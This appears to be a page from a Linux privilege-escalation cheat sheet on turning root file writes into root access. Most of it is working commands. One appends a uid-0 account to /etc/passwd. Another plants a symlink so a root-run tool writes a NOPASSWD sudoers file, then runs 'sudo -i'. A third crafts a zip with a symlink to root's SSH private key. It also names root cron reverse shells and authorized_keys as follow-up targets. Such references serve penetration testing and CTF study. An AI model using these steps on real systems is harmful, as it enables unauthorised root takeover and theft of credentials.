# Privileged file-write paths

[← Linux quick reference](../03-linux-privesc.md)

## Writable /etc/passwd or /etc/shadow
```bash
openssl passwd -1 -salt x pass            # make hash
echo 'root2:<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd ; su root2
# Or blank root's x field if you can edit and no shadow
```

## Arbitrary file write as root → symlink-follow primitives
Root-run write to your path + symlink following → test harmless target first.
```bash
# Pattern: tool copies <src> -> <dst> as root and follows symlinks on <dst>.
# 1) make the payload (mode matters for sudoers: must be 0440)
echo 'youruser ALL=(ALL) NOPASSWD:ALL' > payload; chmod 440 payload
# 2) plant a symlink where the tool will WRITE, pointing at the target file
ln -s /etc/sudoers.d/pwn dst_link
# 3) run the root tool so it copies payload -> dst_link (= /etc/sudoers.d/pwn)
#    then:
sudo -i        # you're root
```
After confirming root write:
- `/etc/sudoers.d/pwn` → `youruser ALL=(ALL) NOPASSWD:ALL` (file MUST be mode 0440, no syntax errors). Cleanest.
- `/etc/passwd` → append a `uid=0` user with a known hash (see above).
- root cron (`/etc/cron.d/x`) → reverse shell on a schedule.
- `/root/.ssh/authorized_keys` → only works if `PermitRootLogin` allows it. Check the setting first.

Archive extraction: test symlink-member handling and exact destination; `../` rejection does not settle symlinks.
```bash
# source-side symlink in the archive -> arbitrary READ as root (if extraction reads the link)
ln -s /root/.ssh/id_rsa leak; zip --symlinks evil.zip leak
# destination-side symlink at the extract path -> arbitrary WRITE as root (sudoers.d trick above)
```
> Reproduce the extractor's exact behavior locally first. Check whether it creates a symlink, follows one, or writes a regular file, and which user owns the extraction process.
